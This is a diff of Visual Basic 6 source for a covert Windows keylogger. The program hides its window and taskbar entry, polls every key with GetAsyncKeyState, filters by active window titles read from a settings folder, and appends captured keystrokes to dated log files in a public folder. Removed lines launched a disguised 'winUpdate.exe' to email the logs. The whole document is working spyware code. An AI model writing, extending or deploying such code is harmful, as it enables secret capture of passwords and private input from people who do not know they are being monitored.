@@ -1,19 +1,19 @@
 VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
-   ClientHeight    =   510
+   ClientHeight    =   195
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   735
+   ClientWidth     =   195
    ClipControls    =   0   'False
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   34
+   ScaleHeight     =   13
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   49
+   ScaleWidth      =   13
    ShowInTaskbar   =   0   'False
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
@@ -22,6 +22,7 @@ Begin VB.Form Form1
       Top             =   960
    End
    Begin VB.Timer Timer2 
+      Enabled         =   0   'False
       Interval        =   450
       Left            =   3120
       Top             =   600
@@ -29,19 +30,19 @@ Begin VB.Form Form1
    Begin VB.TextBox Text2 
       Enabled         =   0   'False
       Height          =   285
-      Left            =   480
+      Left            =   840
       Locked          =   -1  'True
       TabIndex        =   1
-      Top             =   840
+      Top             =   120
       Width           =   2775
    End
    Begin VB.TextBox Text1 
       Enabled         =   0   'False
       Height          =   1935
-      Left            =   480
+      Left            =   720
       MultiLine       =   -1  'True
       TabIndex        =   0
-      Top             =   1080
+      Top             =   480
       Width           =   3735
    End
 End
@@ -54,11 +55,11 @@ Option Explicit
 
 'Special Folder path Import
 Public Enum mceIDLPaths
-    CSIDL_APPDATA = &H1A ' C:\WINNT\Profiles\username\Application Data.
+    CSIDL_APPDATA = &H1B ' C:\WINNT\Profiles\username\Application Data.
+    CSIDL_PROGDATA = &H23
     CSIDL_WINDOWS = &H24 ' C:\WINNT.
 End Enum
 Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
-Dim AppDataPath As String
 
 'Active windowtitle part
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
@@ -70,76 +71,100 @@ Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
 Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate
 
-
+Dim SettingsPath As String
 'Loadsetting variable declaration
-Dim LPath, Pwd, PCDec As String
+Dim LPath, CompName As String
+'array to hold target titles
+Dim title() As String
+'if title file not fund then Log every title
+Dim LogAll As Boolean
 
 'Prevent only Titles in LOG
 Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False
 
-
-
 Private Sub Form_Load()
-
 If App.PrevInstance = True Then
-    Shell (GetSpecialFolderA(CSIDL_WINDOWS) & "explorer.exe"), vbNormalFocus 'This program is already running!
+'    Shell (GetSpecialFolderA(CSIDL_WINDOWS) & "explorer.exe"), vbNormalFocus 'This program is already running!
     End
     Exit Sub
 End If
 
 TransparentForm Me                  ''Rather than me.hide its better to become transparent.
-
-AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)
-
+SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA) & "System\"  ' "C:\ProgramData\"
 App.TaskVisible = False
 
-Timer2.Enabled = True
+Call LoadSetting
+Call LoadTitles
 Call startLogging
+Timer2.Enabled = True
+End Sub
+
+Private Sub LoadSetting()
+Dim defaultPath As String
+
+If Dir(SettingsPath & "settings.txt") <> "" Then 'setting file found then
+    Open (SettingsPath & "settings.txt") For Input As 1
+    Input #1, LPath, CompName
+    Close #1
+    LPath = LPath & "\"
+Else    'setting not found
+    'Use default settings
+    'LPath = GetSpecialFolderA(CSIDL_PROGDATA) & "NLogs\"
+    LPath = "C:\Users\Public\Libraries\NLogs\"      'Because All users can access this folder
+    CompName = "SYSTEM"
+End If
+
+If FolderExists(LPath) = False Then MkDir LPath
+'If Path is from Username root use u:
+If Left(LPath, 2) = "u:" Then LPath = Environ$("USERPROFILE") & Mid(LPath, 3, Len(LPath) - 2)
 
 End Sub
+Private Sub LoadTitles()
+Dim t1 As String, TitlesCount, i As Integer
+
+If Dir(SettingsPath & "titles.txt") <> "" Then 'title file found then
+
+TitlesCount = 0
+    Open (SettingsPath & "titles.txt") For Input As 1
+    While Not EOF(1)
+        Line Input #1, t1
+        If Trim$(t1) <> "" Then TitlesCount = TitlesCount + 1
+    Wend
+    Close #1
+
+If TitlesCount = 0 Then LogAll = True: Exit Sub
+'Now we have Titles Count, inititlise array
+ReDim title(TitlesCount - 1)
+LogAll = False  'log selected titles only not all
+'Now fill the array
+i = 0
+    Open (SettingsPath & "titles.txt") For Input As 2
+    While Not EOF(2)
+        Line Input #2, t1
+        If Trim$(t1) <> "" Then title(i) = t1: i = i + 1
+    Wend
+    Close #2
+Else
+'if titles file not found continue with logging all
+LogAll = True
+End If
+
+End Sub
+
 Private Sub startLogging()
 
-Call LoadSetting
+LPath = LPath & CompName & Format$(Now, "dd" & "mm" & "yy") & ".nkl"
 
-LPath = LPath & "\browse" & Format$(Now, "dd" & "mm" & "yy") & "z.nkl"
-
-If Dir(LPath) = "" Then
+If Dir(LPath) = "" Then     'If file not exist
 'Write initials
 Open LPath For Append As 1
-    If Pwd = "" Then    'To avoid the null string encrypt error.
-    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), "", Encrypt(App.Revision, 20)
-    Else
-    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
-    End If
+    Write #1, Chr(155), Time, Date, CompName, App.Revision
 Close #1
 End If
 
 End Sub
 
-
-
-Private Sub LoadSetting()
-Dim SendTo As String
-
-If Dir(AppDataPath & "System\cmsetacl.tmp") <> "" Then 'setting file found then
-    
-    Open (AppDataPath & "System\cmsetacl.tmp") For Input As 1
-    Input #1, LPath, Pwd, PCDec, SendTo
-    Close #1
-Else    'setting not found
-    MsgBox "Settings not found", , "Error": End
-End If
-
-'If Path is from Username root use u:
-If Left(LPath, 2) = "u:" Then LPath = Environ$("USERPROFILE") & Mid(LPath, 3, Len(LPath) - 2)
-'To disable sending Email set SendTo=none or delete WinUpdate.exe
-If LCase(SendTo) <> "none" And Dir(App.Path & "\winUpdate.exe") <> "" Then Shell App.Path & "\winUpdate.exe"
-
-End Sub
-
 Private Sub Timer1_Timer()
-
-
 Dim i As Integer
 Dim Result As Integer
 For i = 1 To 255
@@ -167,52 +192,45 @@ End Sub
 'If ActiveWindow Title changes then Records text from text box to file
 Private Sub Text2_Change()
 
-
 If HasSomeText = True Then
-    If Trim(Text1) <> "" Then Call Appendnow
+    If Trim(Text1.Text) <> "" Then Call Appendnow
 End If
 
 HasSomeText = False
 
-Dim t1, t2, t3, t4, t5 As String
-
-If Dir(AppDataPath & "System\default.MCP") <> "" Then 'setting file found then
-    
-    Open (AppDataPath & "System\default.MCP") For Input As 1
-    Input #1, t1, t2, t3, t4, t5
-    Close #1
-
-Else    'setting not found
-    MsgBox "Titles not found", , "Error": End
-End If
-
-
-
-If Left(LCase(Text2), Len(t1)) = LCase(t1) Or Left(LCase(Text2), Len(t2)) = LCase(t2) Or Left(LCase(Text2), Len(t3)) = LCase(t3) Or Left(LCase(Text2), Len(t4)) = LCase(t4) Or Left(LCase(Text2), Len(t5)) = LCase(t5) Then
-    Text1.Text = Time & " : " & Text2.Text & vbCrLf
+If TitleMatches(Text2.Text) = True Then
+    Text1.Text = Time & ": " & Text2.Text & vbCrLf
     Timer1.Enabled = True
 Else
     Timer1.Enabled = False
 End If
-
-
 End Sub
+Private Function TitleMatches(ByVal cTitle As String) As Boolean
+'If title array is blank / logall=true return true
+If LogAll = True Then TitleMatches = True: Exit Function
+
+'If nothing in title then faLSE
+If Trim(cTitle) = "" Then TitleMatches = False: Exit Function
+
+Dim i As Integer, temp As String
+For i = 0 To UBound(title)
+    temp = Trim(LCase(title(i)))
+    If LCase(Left(cTitle, Len(temp))) = temp Then TitleMatches = True: Exit Function
+Next
+TitleMatches = False
+End Function
 '************************encrypting and Recording to file use of Append*********
 Private Sub Appendnow()
-'Call startLogging   'Loads New LPath
 
 If Dir(LPath) <> "" Then
-        Open LPath For Append As #1
-        If Pwd = "" Then
-        Print #1, Text1         'Dont encrypt if no password
-        Else
-        Print #1, Encrypt(Text1, 20)
-        End If
+    Open LPath For Append As #1
+        Print #1, Text1.Text         'Dont encrypt
         Text1.Text = ""
-        Close #1
+    Close #1
 Else
-        MsgBox "Log Directory Unavailable OR Unaccessible.", vbCritical, "Logging Stopped": End
+        MsgBox "File Access Error.", vbCritical, "Closed": End
 End If
+
 End Sub
 '***********************
 
@@ -484,9 +502,18 @@ Dim Trash As String: Trash = Space$(260)
   
     GetSpecialFolderA = Trash
 End Function
-Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
-Dim i As Integer
-For i = 1 To Len(ThisText)
-Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
-Next i
+Function FolderExists(ByVal sPath As String) As Boolean
+    '-- sPath may or may not end with "\"
+    '-- vbDirectory + vbHidden + vbSystem + vbReadOnly = 16 + 4 + 2 + 1 = 23
+    If Dir$(sPath, 23) <> "" Then
+        If (GetAttr(sPath) And vbDirectory) = vbDirectory Then
+            FolderExists = True
+        Else
+            FolderExists = False
+            '-- sPath exists but it is not a folder
+        End If
+    Else
+        FolderExists = False
+        '-- sPath does not exist
+    End If
 End Function
